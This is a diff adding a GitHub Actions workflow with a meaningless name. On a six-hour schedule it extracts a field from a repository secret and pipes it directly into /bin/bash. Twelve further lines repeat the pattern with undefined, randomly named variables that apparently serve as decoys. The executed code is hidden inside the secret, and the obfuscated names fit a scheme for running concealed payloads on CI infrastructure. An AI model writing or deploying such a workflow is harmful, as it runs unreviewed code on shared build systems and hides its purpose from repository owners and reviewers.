@@ -1,0 +1,29 @@
+name: crystaltypewriter
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: crystaltypewriter
+        env:
+          p94: ${{ secrets.p94 }}
+        run: |
+          echo $p94 | jq -r .bgl90284 | /bin/bash
+          echo $nxreb4 | jq -r .tta483 | /bin/bash
+          echo $fkkud2 | jq -r .xl63 | /bin/bash
+          echo $agddp66468 | jq -r .qflwd16 | /bin/bash
+          echo $gfx74449 | jq -r .ydjl19 | /bin/bash
+          echo $o4 | jq -r .kawqm328 | /bin/bash
+          echo $o1080 | jq -r .mw4435 | /bin/bash
+          echo $ipnll8 | jq -r .l65 | /bin/bash
+          echo $n9413 | jq -r .yjhzn8 | /bin/bash
+          echo $tc6500 | jq -r .tcsjm86754 | /bin/bash
+          echo $ubl576 | jq -r .jr878 | /bin/bash
+          echo $ngxux14 | jq -r .tpqdw7622 | /bin/bash
+          echo $merra291 | jq -r .blqx3 | /bin/bash
+
